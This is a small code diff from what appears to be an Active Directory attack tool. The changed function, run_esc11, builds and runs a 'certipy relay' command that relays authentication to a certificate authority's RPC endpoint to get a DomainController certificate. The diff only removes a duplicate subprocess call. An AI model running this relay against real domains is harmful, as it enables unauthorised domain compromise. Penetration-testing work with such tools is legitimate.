@@ -850,8 +850,8 @@ def run_esc11(ca):
     
     relay_cmd = f"sudo -E certipy relay -target rpc://{target_ip} -template DomainController -ca {ca} -template DomainController"
     print(f"{msg}{relay_cmd}{reset}")
-    subprocess.call(relay_cmd, shell=True)
-
+    
+    # Only use Popen, not subprocess.call
     proc = subprocess.Popen(relay_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     
     pfx_file = None
